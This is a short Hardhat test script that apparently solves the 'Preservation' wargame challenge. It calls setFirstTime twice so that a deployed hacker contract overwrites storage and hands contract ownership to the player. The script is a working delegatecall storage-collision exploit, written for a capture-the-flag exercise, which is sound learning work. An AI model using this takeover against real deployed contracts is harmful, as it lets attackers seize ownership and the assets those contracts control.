const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Preservation hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        preservation = await ethers.getContractAt("Preservation", process.env.PRESERVATION_ADDRESS);
        hacker = await (await ethers.getContractFactory("LibraryContractHacker")).deploy();
        hacker.deployed();
});
    describe("Hack test", function() {
        it("Should claim ownership", async function() {
            expect(await preservation.owner()).to.not.equal(player.address);
            await preservation.setFirstTime(hacker.address); //change value of timeZone1Library to hacker.address
            await preservation.setFirstTime(player.address);//change value of owner to player.address
            expect(await preservation.owner()).to.equal(player.address);
        });
    });
});